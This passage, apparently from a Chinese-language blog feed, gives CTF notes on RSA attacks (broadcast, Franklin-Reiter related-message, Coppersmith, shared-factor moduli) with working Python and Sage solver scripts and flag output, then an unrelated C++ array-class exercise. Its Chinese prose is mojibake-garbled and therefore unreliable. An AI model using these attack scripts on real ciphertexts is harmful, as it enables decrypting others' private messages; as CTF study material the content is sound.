972463871360669070584682807703870684830948023158889780219716829353665600564791257912082043905122048004593803193375178269942973208249276102769671038752489438400731535367257356207098737711096953679231300720903502192144476519811856646400822239966219746455729409375771797064825552958482297097797911599808242875799342438899636328763766908154658738969614707377852147843953614178305416594819846812426828300689497046389665982817209315784313108617753052015326937047712513569322963102500122038505770232917473260057408981125469607573191926134043719437868156273,23257483042331781031320004066395973098539881870433034498180628292164825476845647596122889756396987220787263478778647199033523248861079487991256044473644515960559630792146394039814096408486541588067643811077716428015000310006227815563853161604153799667073262886506475792902392829571472354691875108497532721686076971371510238161060553858839091026451266521753830084143245517459861325880906431205328541736948784727909518259034781432825317588016829248046749554245422672923121452470552323438808591118050034108325754535134236727740460190849252647561826203675666601441506024780605194340777802389960180532831878689458096046821,27637004622327338030988157906180324667829916751358977640832765328645718696385482091781513197472066052101704131751158627239657425473994441143385613105528200215275110466263289952962400664293602133856809475295970322767309563273999319926150648399522508592521685688896842833243324070987594588134776515978198364901455727292006058624015674914131447232032058875410956114939938460192876157612457774033922125553271809409381181134668696682847583314698759337802814876161751333701826176655372126746717533228292189928645064111959824895679517476699556313948724818860906006774808944802984477517788391260149504822396276593451707118257]

c=[4675182605549711347653299514777826238559040200527747810846901991433127025723361807211672208052862870258047285285949212515664278410499603829663266213968511493974766674071825225536665267049044619340378438531615983696406305841945756396579371794826265549929503043134668360055027276522368879193620937457881486509311711905722483187734650127796510808637890189952840971330768913946884525594627652458745930532219238258911608744112001798136394806004726472890838481881026716605743812674350955258003794590748258523929460446986020794445478076559635145181909093786617716473870604463315696183050495143502762614767485881979217577416,4586033930015814975553487614321341290358072960539564849589758593801587823414394351862074093343255479635303199078561905260793645869942622136164615776822867275172888812989071016687658023005838776181437470204528335444413852561895603377955959308318399246963213964044984235974352824060625970587119586612774322385216810264819426458641852166009899106655036755913322283219739741020656812034348404092018340277026844114272699170323014050087289715403989671918767712613414346320222745328800096615947138667139053339483278319521201983885423491905171167675501563556563890821756892474999549635650486944010346554641603343238490572689,12012575342366442210994368605032582129674485327006093552902983877957202172783938071684841031902396156899396879136388606996807608296316795628987877357547213450360953742947781700549506469226564975927361748596520878542651668963131021269851928174681007347771519569914690980744941965086762285630082781013781879511681353119117280354102271439057204066405072328422057721895983540492150402309552609035008272366176657384174081229798739099558539083074489500359062010164358300087124447037922844709870430218019673914305742939927888838599616520300011913022792060392260618046807788302643742874847024153198113792628046678578753632923,4249005911324898630458723491151576810198619078332972911420166645127258598519950448507640904379342817486426262054889199369385257812524759761245588973651578211291344326619317559377360319507727729535083143293335799588196976241949218037833747839545295030259115279668065886560417877204054684495047181117075603468672292268831273735956964067626837975218539840667641885621426607941950306330198897187683754687379611844278471572791816397950634388907233312117920634807989734011132718334334850592111651631323130933438007008983489782601827321396168104668493332626558911838721998173148508994771473224050827471186478106896949413831,18557109853898405974924769550105345673703067457537813607252151469933140760798378574244439559372100428971400070351173140348823652755825601433268832363575896137364288069984314151346137206115518309597389268875150549696376813277778514591532615794294637044626683931367510181612383681914421702261592233265455950023252407680604041046629667703207133146853618989187597749132650514038584280417791134426596848369417626039533740827554552117727501565841065077835398951826747855393552731497438983274201599740189743630949174610722118659019630964669901438690028070213710833335622573526403588737092869273969581607637522572757015237506,19221531342713801219971420455098666365124810169512711030444063942333694562364114172361552139176582476168134219937393468391346535097965763785916484012657401095066804857900941482772687159471483908107669892419626059680168762119954068288719303591498504050604628627299671160225276355636519961578118413913001058744164531470610279168723402009469959377794138715204862239973561494796213624769358906726186769711689962808937828553399403173762034548974335960107700638910231658795639167906700770120741974418495196827830462542130080965552102416180517600397897065113788279096066792533807104187868678848857780735334749865813019681909,2043866718532927301454127017521835945401727173760352488220517028498861777262807036566165189285730569375083406234212921588654098421290088269551352101830688429903600880691046607902396566775005694148315605616437713115424223594710186677844867273218443350479253279231960061845711898262461185970057002138523262952260834191169438764964758526877361442277664448596129451496415695776781879266732057920583336999766633938582656240607973759756021032489262381190762825081392613689817792764844409877116240223852376311404164963595040347176139494461319495285348608562589901671620063620688524249523700500144604558899272202564535295466,9018406452041117867927204674649220929160509942604290572303644183451237944912470236367308266319079349289625873447647200474598755869642999213142758825809522474810817609751187533346902667225032452694187162262683056445775455963994237202296104812386374636270188433521927503415507963477240913270879794141170568393025367891003921090015993944946205723601349149601256727433716155121883420271498265967234259068535172501445643752691860997480636101699340740265505767091920668218018002976632111256430655619061247292025654740889077014179258647084698229733160071306390020603636210736363198302407289195286953980520285032528614492926,17978671919734595201524186618868659656036765546673883938819333911564948587858876495802600244078413312462813938682090761599961604959609423010904187720748539707172853352540370208991902929002036775381503365170196838626379685712050728875172622632447875368166743751159775611642629408534890684109652648484868876710697249351895355111511281037497347712241242908563699707272843032773107477368790419109907271096351457526240471975122296483655337150130000812813081239181653384419149292970320991892073352340649237387406498087734708162094476092368665794350968924289259192893289337038201504066310173284757044802449600666007821509553,8597067880812456123669594978660135058668875834924201279924162761020137582662367704504988576614934966062323191666982943113656186783894245035267051756178331490881264629774635620179678000947771928854566239213498586078670870127924696459041295848474073879336501325437194563845414699360564571136683492426292766799121155041276162673427700999761055592609213603158576637212003771003996722743170543342885011289692845493598413965688949325670519743413071479057382602222055902593614159427186017797992219490308930116850084553033461316509457834436420821916094206010206229370273622681413176347187252950087428868295965528772832409316]

data=[]
for i in range(len(c)):
    data += [(c[i],n[i])]
x, n = chinese_remainder_theorem(data)
realnum = gmpy.mpz(x).root(e)[0].digits()
print my_parse_number(int(realnum))</code></pre>
<h3 id="Broadcast-Attack-with-Linear-Padding"><a href="#Broadcast-Attack-with-Linear-Padding" class="headerlink" title="Broadcast Attack with Linear Padding"></a>Broadcast Attack with Linear Padding</h3><blockquote>
<p><a href="https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations">https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Generalizations</a></p>
</blockquote>
<h3 id="Related-Message-Attack"><a href="#Related-Message-Attack" class="headerlink" title="Related Message Attack"></a>Related Message Attack</h3><blockquote>
<p>å…ˆå¼•ç”¨ctf-wikiçš„è§£é‡Šï¼Œç­‰å®Œå…¨ç†è§£äº†å†ç¼–è¾‘</p>
</blockquote>
<p><strong>æ¡ä»¶ï¼š</strong></p>
<p>å½“ Alice ä½¿ç”¨åŒä¸€å…¬é’¥å¯¹ä¸¤ä¸ªå…·æœ‰æŸç§çº¿æ€§å…³ç³»çš„æ¶ˆæ¯ M1 ä¸ M2 è¿›è¡ŒåŠ å¯†ï¼Œå¹¶å°†åŠ å¯†åçš„æ¶ˆæ¯ C1ï¼ŒC2 å‘é€ç»™äº† Bob æ—¶ï¼Œæˆ‘ä»¬å°±å¯èƒ½å¯ä»¥è·å¾—å¯¹åº”çš„æ¶ˆæ¯ M1 ä¸ M2ã€‚è¿™é‡Œæˆ‘ä»¬å‡è®¾æ¨¡æ•°ä¸º Nï¼Œä¸¤è€…ä¹‹é—´çš„çº¿æ€§å…³ç³»å¦‚ä¸‹</p>
<p>$$ M_1 \equiv f(M_2) \bmod N $$</p>
<p>å…¶ä¸­ f ä¸ºä¸€ä¸ªçº¿æ€§å‡½æ•°ï¼Œæ¯”å¦‚è¯´ $f=ax+b$ã€‚</p>
<p>åœ¨å…·æœ‰è¾ƒå°é”™è¯¯æ¦‚ç‡ä¸‹çš„æƒ…å†µä¸‹ï¼Œå…¶å¤æ‚åº¦ä¸º $O(elog^2N)$ã€‚</p>
<p>è¿™ä¸€æ”»å‡»ç”± Franklinï¼ŒReiter æå‡ºã€‚</p>
<p><strong>åŸç†ï¼š</strong></p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬çŸ¥é“ $C_1 \equiv M_1 ^e \bmod N$ï¼Œå¹¶ä¸” $M_1 \equiv f(M_2) \bmod N$ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥çŸ¥é“ $M_2$ æ˜¯ $f(x)^e \equiv C_1 \bmod N$ çš„ä¸€ä¸ªè§£ï¼Œå³å®ƒæ˜¯æ–¹ç¨‹ $f(x)^e-C_1$ åœ¨æ¨¡ N æ„ä¹‰ä¸‹çš„ä¸€ä¸ªæ ¹ã€‚åŒæ ·çš„ï¼Œ$M_2$ æ˜¯ $x^e - C_2$ åœ¨æ¨¡ N æ„ä¹‰ä¸‹çš„ä¸€ä¸ªæ ¹ã€‚æ‰€ä»¥è¯´ $x-M_2$ åŒæ—¶æ•´é™¤ä»¥ä¸Šä¸¤ä¸ªå¤šé¡¹å¼ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æ±‚å¾—ä¸¤ä¸ªå¤šé¡¹å¼çš„æœ€å¤§å…¬å› å­ï¼Œå¦‚æœæœ€å¤§å…¬å› å­æ°å¥½æ˜¯çº¿æ€§çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æ±‚å¾—äº† $M_2$ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ $e=3$ çš„æƒ…å†µä¸‹ï¼Œæœ€å¤§å…¬å› å­ä¸€å®šæ˜¯çº¿æ€§çš„ã€‚</p>
<p>è¿™é‡Œæˆ‘ä»¬å…³æ³¨ä¸€ä¸‹ $e=3$ï¼Œä¸” $f(x)=ax+b$ çš„æƒ…å†µã€‚é¦–å…ˆæˆ‘ä»¬æœ‰</p>
<p>$$ C_1 \equiv M_1 ^3 \bmod N,M_1 \equiv aM_2+b \bmod N $$</p>
<p>é‚£ä¹ˆæˆ‘ä»¬æœ‰</p>
<p>$$ C_1 \equiv (aM_2+b)^3 \bmod N,C_2 \equiv M_2^3 \bmod N $$</p>
<p>æˆ‘ä»¬éœ€è¦æ˜ç¡®ä¸€ä¸‹æˆ‘ä»¬æƒ³è¦å¾—åˆ°çš„æ˜¯æ¶ˆæ¯ mï¼Œæ‰€ä»¥éœ€è¦å°†å…¶å•ç‹¬æ„é€ å‡ºæ¥ã€‚</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬æœ‰å¼ 1</p>
<p>$$ (aM_2+b)^3=a^3M_2^3+3a^2M^2b+3aM_2b^2+b^3 $$</p>
<p>å†è€…æˆ‘ä»¬æ„é€ å¦‚ä¸‹å¼ 2</p>
<p>$$ (aM_2)^3-b^3 \equiv (aM_2-b)(a^2M_2^2+aM_2b+b^2) \bmod N $$</p>
<p>æ ¹æ®å¼ 1 æˆ‘ä»¬æœ‰</p>
<p>$$ a^3M_2^3-2b^3+3b(a^2M_2^2+aM_2b+b^2) \equiv C_1 \bmod N $$</p>
<p>ç»§è€Œæˆ‘ä»¬æœ‰å¼ 3</p>
<p>$$ 3b(a^2M_2^2+aM_2b+b^2) \equiv C_1-a^3C_2+2b^3 \bmod N $$</p>
<p>é‚£ä¹ˆæˆ‘ä»¬æ ¹æ®å¼ 2 ä¸å¼ 3 å¯å¾—</p>
<p>$$ (a^3C_2-b^3)*3b \equiv (aM_2-b)( C_1-a^3C_2+2b^3 ) \bmod N $$</p>
<p>è¿›è€Œæˆ‘ä»¬æœ‰</p>
<p>$$ aM_2-b=\frac{3a^3bC_2-3b^4}{C_1-a^3C_2+2b^3} $$</p>
<p>è¿›è€Œ</p>
<p>$$ aM_2\equiv \frac{2a^3bC_2-b^4+C_1b}{C_1-a^3C_2+2b^3} $$</p>
<p>è¿›è€Œ</p>
<p>$$ M_2 \equiv\frac{2a^3bC_2-b^4+C_1b}{aC_1-a^4C_2+2ab^3}=\frac{b}{a}\frac{C_1+2a^3C_2-b^3}{C_1-a^3C_2+2b^3} $$</p>
<p>ä¸Šé¢çš„å¼å­ä¸­å³è¾¹æ‰€æœ‰çš„å†…å®¹éƒ½æ˜¯å·²çŸ¥çš„å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è·å–å¯¹åº”çš„æ¶ˆæ¯ã€‚</p>
<p>æœ‰å…´è¶£çš„å¯ä»¥è¿›ä¸€æ­¥é˜…è¯» <a href="https://www.iacr.org/archive/pkc2005/33860001/33860001.pdf">A New Related Message Attack on RSA</a> ä»¥åŠ <a href="https://www.cs.unc.edu/~reiter/papers/1996/Eurocrypt.pdf">paper</a> è¿™é‡Œæš‚ä¸åšè¿‡å¤šçš„è®²è§£ã€‚</p>
<p><strong>é¢˜ç›®ï¼š</strong></p>
<p>è¿™é‡Œæˆ‘ä»¬ä»¥ SCTF RSA3 ä¸­çš„ level3 ä¸ºä¾‹è¿›è¡Œä»‹ç»ã€‚é¦–å…ˆï¼Œè·Ÿè¸ª TCP æµå¯ä»¥çŸ¥é“ï¼ŒåŠ å¯†æ–¹å¼æ˜¯å°†æ˜æ–‡åŠ ä¸Šç”¨æˆ·çš„ user id è¿›è¡ŒåŠ å¯†ï¼Œè€Œä¸”è¿˜å­˜åœ¨å¤šç»„ã€‚è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ç¬¬ 0 ç»„å’Œç¬¬ 9 ç»„ï¼Œä»–ä»¬çš„æ¨¡æ•°ä¸€æ ·ï¼Œè§£å¯†è„šæœ¬å¦‚ä¸‹</p>
<pre><code class="python">import gmpy2
id1 = 1002
id2 = 2614

c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718L
c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08L
n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553
a = 1
b = id1 - id2


def getmessage(a, b, c1, c2, n):
    b3 = gmpy2.powmod(b, 3, n)
    part1 = b * (c1 + 2 * c2 - b3) % n
    part2 = a * (c1 - c2 + 2 * b3) % n
    part2 = gmpy2.invert(part2, n)
    return part1 * part2 % n


message = getmessage(a, b, c1, c2, n) - id2
message = hex(message)[2:]
if len(message) % 2 != 0:
    message = &#39;0&#39; + message

print message.decode(&#39;hex&#39;)</code></pre>
<p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ sage æ¥åšï¼Œä¼šæ›´åŠ ç®€å•ä¸€ç‚¹ã€‚</p>
<pre><code class="python">import binascii

def attack(c1, c2, b, e, n):
    PR.&lt;x&gt;=PolynomialRing(Zmod(n))
    g1 = x^e - c1
    g2 = (x+b)^e - c2

    def gcd(g1, g2):
        while g2:
            g1, g2 = g2, g1 % g2
        return g1.monic()
    return -gcd(g1, g2)[0]

c1 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c5bb724d1cee07e221e028d9b8bc24360208840fbdfd4794733adcac45c38ad0225fde19a6a4c38e4207368f5902c871efdf1bdf4760b1a98ec1417893c8fce8389b6434c0fee73b13c284e8c9fb5c77e420a2b5b1a1c10b2a7a3545e95c1d47835c2718L
c2 = 0x547995f4e2f4c007e6bb2a6913a3d685974a72b05bec02e8c03ba64278c9347d8aaaff672ad8460a8cf5bffa5d787c72722fe4fe5a901e2531b3dbcb87e5aa19bbceecbf9f32eacefe81777d9bdca781b1ec8f8b68799b4aa4c6ad120506222c7f0c3e11b37dd0ce08381fabf9c14bc74929bf524645989ae2df77c8608d0512c1cc4150765ab8350843b57a2464f848d8e08L
n = 25357901189172733149625332391537064578265003249917817682864120663898336510922113258397441378239342349767317285221295832462413300376704507936359046120943334215078540903962128719706077067557948218308700143138420408053500628616299338204718213283481833513373696170774425619886049408103217179262264003765695390547355624867951379789924247597370496546249898924648274419164899831191925127182066301237673243423539604219274397539786859420866329885285232179983055763704201023213087119895321260046617760702320473069743688778438854899409292527695993045482549594428191729963645157765855337481923730481041849389812984896044723939553
e=3
a = 1
id1 = 1002
id2 = 2614
b = id2 - id1
m1 = attack(c1,c2, b,e,n)
print binascii.unhexlify(&quot;%x&quot; % int(m1 - id1))</code></pre>
<h3 id="Coppersmithâ€™s-short-pad-attack"><a href="#Coppersmithâ€™s-short-pad-attack" class="headerlink" title="Coppersmithâ€™s short-pad attack"></a>Coppersmithâ€™s short-pad attack</h3><p>è¿‡çŸ­çš„paddingé•¿åº¦å¯¼è‡´çš„å®¹æ˜“æ”»å‡»</p>
<h3 id="Known-High-Bits-Message-Attackï¼ˆStereotyped-messagesï¼‰"><a href="#Known-High-Bits-Message-Attackï¼ˆStereotyped-messagesï¼‰" class="headerlink" title="Known High Bits Message Attackï¼ˆStereotyped messagesï¼‰"></a>Known High Bits Message Attackï¼ˆStereotyped messagesï¼‰</h3><p><strong>æ¡ä»¶ï¼š</strong>çŸ¥é“äº†æ¶ˆæ¯mçš„å¾ˆå¤§ä¸€éƒ¨åˆ†$m_0$</p>
<p>ç°åœ¨ï¼Œ$c=(m_0+x)^e\mod n$ï¼Œä¹Ÿå°±æ˜¯$f(x)=(m + x)^e - c$æœ‰ä¸€ä¸ªè§£æ»¡è¶³$f(x)=k\cdot N(k=0,1,2\cdots)$,æ±‚è§£xã€‚</p>
<p>ä¾æ®oppersmithå®šç†æ˜¯å¯ä»¥æ±‚å‡ºå‰©ä¸‹çš„æ‰€æœ‰æ˜æ–‡éƒ¨åˆ†ã€‚</p>
<pre><code class="python">dd = f.degree()
beta = 1
epsilon = beta / 7
mm = ceil(beta**2 / (dd * epsilon))
tt = floor(dd * mm * ((1/beta) - 1))
XX = ceil(N**((beta**2/dd) - epsilon))
roots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX)</code></pre>
<blockquote>
<p><a href="https://github.com/mimoo/RSA-and-LLL-attacks">https://github.com/mimoo/RSA-and-LLL-attacks</a></p>
</blockquote>
<h3 id="Factoring-with-high-bits-known"><a href="#Factoring-with-high-bits-known" class="headerlink" title="Factoring with high bits known"></a>Factoring with high bits known</h3><p><strong>æ¡ä»¶ï¼š</strong>çŸ¥é“ä¸€ä¸ªå…¬é’¥ä¸­æ¨¡æ•° N çš„ä¸€ä¸ªå› å­çš„è¾ƒé«˜ä½æ—¶</p>
<h3 id="æ¨¡ä¸äº’ç´ "><a href="#æ¨¡ä¸äº’ç´ " class="headerlink" title="æ¨¡ä¸äº’ç´ "></a>æ¨¡ä¸äº’ç´ </h3><p><strong>æ¡ä»¶ï¼š</strong>ä¸¤ä¸ªå…¬é’¥çš„ N ä¸äº’ç´ </p>
<p><strong>åŸç†ï¼š</strong>é¢˜ç›®ç»™å‡ºäº†ä¸¤ä¸ªæˆ–å¤šä¸ªN,eæˆ–å…¬é’¥ï¼Œä¸¤ä¸ªNå¦‚æœä¸äº’ç´ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ¯”è¾ƒå®¹æ˜“çš„æ‰¾åˆ°ä»–ä»¬çš„æœ€å¤§å…¬å› æ•°ï¼Œç„¶åå°±å¾—åˆ°pï¼Œqäº†ï¼Œè¿›è€Œå¯ä»¥æ±‚å‡ºç§é’¥è¿›è¡Œè§£å¯†äº†ã€‚</p>
<pre><code class="python">import gmpy2
import libnum

n1 = input(&quot;n1:&quot;)
n2 = input(&quot;n2:&quot;)

p1 = gmpy2.gcd(n1, n2)
q1 = n1 / p1

e = input(&quot;e:&quot;)
phin = (p1 - 1) * (q1 - 1)
d = gmpy2.invert(e, phin)
cipher = input(&quot;c:&quot;)

plain = gmpy2.powmod(cipher, d, n1)
flag = libnum.n2s(plain)
print flag</code></pre>
<p><strong>ä¾‹é¢˜ï¼š</strong>ï¼ˆSCTF RSA2ï¼‰</p>
<p>åœ¨ç»™çš„æ•°æ®åŒ…ä¸­æœ‰10 ä¸ªå«æ•°æ®çš„æŠ¥æ–‡ï¼Œæ¯ä¸ªæ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code>Please send your public key, then We will use your public key to encrypt int(level5.passwd.encode(&#39;hex&#39;), 16), finally, we send the ciphertext to you.
20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031 65537
We have got N is ......
e is ......
encrypted messages is 0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7</code></pre>
<p>ç»™äº†åç»„n,e,cï¼Œå‰ä¸¤ç»„çš„nå°±ä¸äº’ç´ ï¼Œé‡‡ç”¨è¯¥æ”»å‡»æ±‚å‡ºp,qï¼Œè§£å¯†å¾—åˆ°flagã€‚</p>
<pre><code class="python">~python exp.py
n1:20823369114556260762913588844471869725762985812215987993867783630051420241057912385055482788016327978468318067078233844052599750813155644341123314882762057524098732961382833215291266591824632392867716174967906544356144072051132659339140155889569810885013851467056048003672165059640408394953573072431523556848077958005971533618912219793914524077919058591586451716113637770245067687598931071827344740936982776112986104051191922613616045102859044234789636058568396611030966639561922036712001911238552391625658741659644888069244729729297927279384318252191421446283531524990762609975988147922688946591302181753813360518031
n2:19083821613736429958432024980074405375408953269276839696319265596855426189256865650651460460079819368923576109723079906759410116999053050999183058013281152153221170931725172009360565530214701693693990313074253430870625982998637645030077199119183041314493288940590060575521928665131467548955951797198132001987298869492894105525970519287000775477095816742582753228905458466705932162641076343490086247969277673809512472546919489077884464190676638450684714880196854445469562733561723325588433285405495368807600668761929378526978417102735864613562148766250350460118131749533517869691858933617013731291337496943174343464943
e:65537
c:0x68d5702b70d18238f9d4a3ac355b2a8934328250efd4efda39a4d750d80818e6fe228ba3af471b27cc529a4b0bef70a2598b80dd251b15952e6a6849d366633ed7bb716ed63c6febd4cd0621b0c4ebfe5235de03d4ee016448de1afbbe61144845b580eed8be8127a8d92b37f9ef670b3cdd5af613c76f58ca1a9f6f03f1bc11addba30b61bb191efe0015e971b8f78375faa257a60b355050f6435d94b49eab07075f40cb20bb8723d02f5998d5538e8dafc80cc58643c91f6c0868a7a7bf3bf6a9b4b6e79e0a80e89d430f0c049e1db4883c50db066a709b89d74038c34764aac286c36907b392bc299ab8288f9d7e372868954a92cdbf634678f7294096c7
sH1R3_PRlME_1N_rsA_iS_4ulnEra5le</code></pre>
]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>åŠ è§£å¯†</tag>
      </tags>
  </entry>
  <entry>
    <title>C++é¢˜ç›®ï¼ˆOJï¼‰</title>
    <url>/2017/05/04/c-ti-mu-oj/</url>
    <content><![CDATA[<h3 id="1-æ•°ç»„ç±»ï¼ˆ1ï¼‰"><a href="#1-æ•°ç»„ç±»ï¼ˆ1ï¼‰" class="headerlink" title="1.æ•°ç»„ç±»ï¼ˆ1ï¼‰"></a>1.æ•°ç»„ç±»ï¼ˆ1ï¼‰</h3><blockquote>
<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ•´å‹æ•°ç»„ç±»ï¼Œç”¨äºå­˜å‚¨æ•´æ•°å’Œå¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<ol>
<li>Array::Array()æ— å‚æ„é€ æ–¹æ³•ï¼šåˆ›å»ºä¸€ä¸ªç©ºæ•°ç»„å¯¹è±¡ã€‚</li>
<li>Array::size()æ–¹æ³•ï¼šè¿”å›Arrayå¯¹è±¡ä¸­å…ƒç´ ä¸ªæ•°ã€‚</li>
<li>Array::get(int n)æ–¹æ³•ï¼šæŒ‰æ ¼å¼ä»è¾“å…¥è¯»å–nå…ƒç´ ã€‚</li>
<li>ä¸‹æ ‡è¿ç®—ç¬¦ï¼šè¿”å›ä¸‹æ ‡æ‰€æŒ‡çš„å…ƒç´ ã€‚</li>
</ol>
<p>-â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªæ•°ç»„ç±»Arrayï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
<p>append.ccä¸­å·²ç»™å‡ºmain()å‡½æ•°</p>
<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•´æ•°nï¼Œè¡¨ç¤ºæœ‰nç»„æµ‹è¯•æ•°æ®ã€‚</p>
<p>åé¢çš„æ¯è¡Œä»¥ä¸€ä¸ªæ•´æ•°kå¼€å¤´ï¼Œè¡¨ç¤ºåé¢æœ‰kä¸ªæ•´æ•°ã€‚</p>
<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>æŠŠè¾“å…¥çš„æ•°ç»„ï¼Œè¾“å‡ºå‡ºæ¥ã€‚æ¯è¡Œæ•°æ®å¯¹åº”ä¸€ä¸ªè¾“å‡ºã€‚æ ¼å¼è§sampleã€‚</p>
<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4 </p>
<p>2 10 20 </p>
<p>1 0</p>
<p> 0</p>
<p> 3 1 2 3</p>
<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>10 20</p>
<p> 0 </p>
<p>1 2 3</p>
<h2 id="HINT"><a href="#HINT" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code"><a href="#Append-Code" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1572&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;vector&gt;
using namespace std;
class Array&#123;
private:
    vector&lt;int&gt; arr;
    int l;
public:
    Array()&#123;l=0;&#125;
    int size()&#123;return arr.size();&#125;
    void get(int n)&#123;
        arr.resize(n);
        l=n;
        for(int i=0;i&lt;l;i++)&#123;
            int m;
            cin &gt;&gt; m;
            arr[i]=m;
        &#125;
    &#125;
    int operator[](int n)&#123;return arr[n];&#125;
&#125;;
/////////////////////////////////////
int main()
&#123;
    int cases;
    Array arr;
    cin &gt;&gt; cases;
    for(int ca = 1; ca &lt;= cases; ca++)
    &#123;
        int len;
        cin &gt;&gt; len;
        arr.get(len);
        for(int i = 0; i &lt; arr.size(); i++)
            if(i + 1 == arr.size())
                cout &lt;&lt; arr[i];
            else
                cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;;
        cout &lt;&lt; endl;
    &#125;
&#125;</code></pre>
<blockquote>
<p>è¯¦ç»†çš„å‡½æ•°å®ç°åŠŸèƒ½ï¼šå…¶ä¸­vector<int> c.</p>
<p>â€‹                             c.clear()         ç§»é™¤å®¹å™¨ä¸­æ‰€æœ‰æ•°æ®ã€‚</p>
<p>â€‹                             c.empty()         åˆ¤æ–­å®¹å™¨æ˜¯å¦ä¸ºç©ºã€‚</p>
<p>â€‹                             c.erase(pos)        åˆ é™¤posä½ç½®çš„æ•°æ®</p>
<p>â€‹                             c.erase(beg,end) åˆ é™¤[beg,end)åŒºé—´çš„æ•°æ®</p>
<p>â€‹                             c.front()         ä¼ å›ç¬¬ä¸€ä¸ªæ•°æ®ã€‚</p>
<p>â€‹                             c.insert(pos,elem)  åœ¨posä½ç½®æ’å…¥ä¸€ä¸ªelemæ‹·è´</p>
<p>â€‹                             c.pop_back()     åˆ é™¤æœ€åä¸€ä¸ªæ•°æ®ã€‚</p>
<p>â€‹                             c.push_back(elem) åœ¨å°¾éƒ¨åŠ å…¥ä¸€ä¸ªæ•°æ®ã€‚</p>
<p>â€‹                             c.resize(num)     é‡æ–°è®¾ç½®è¯¥å®¹å™¨çš„å¤§å°</p>
<p>â€‹                             c.size()         å›å®¹å™¨ä¸­å®é™…æ•°æ®çš„ä¸ªæ•°ã€‚</p>
<p>â€‹                             c.begin()           è¿”å›æŒ‡å‘å®¹å™¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„è¿­ä»£å™¨</p>
<p>â€‹                             c.end()             è¿”å›æŒ‡å‘å®¹å™¨æœ€åä¸€ä¸ªå…ƒç´ çš„è¿­ä»£å™¨</p>
</blockquote>
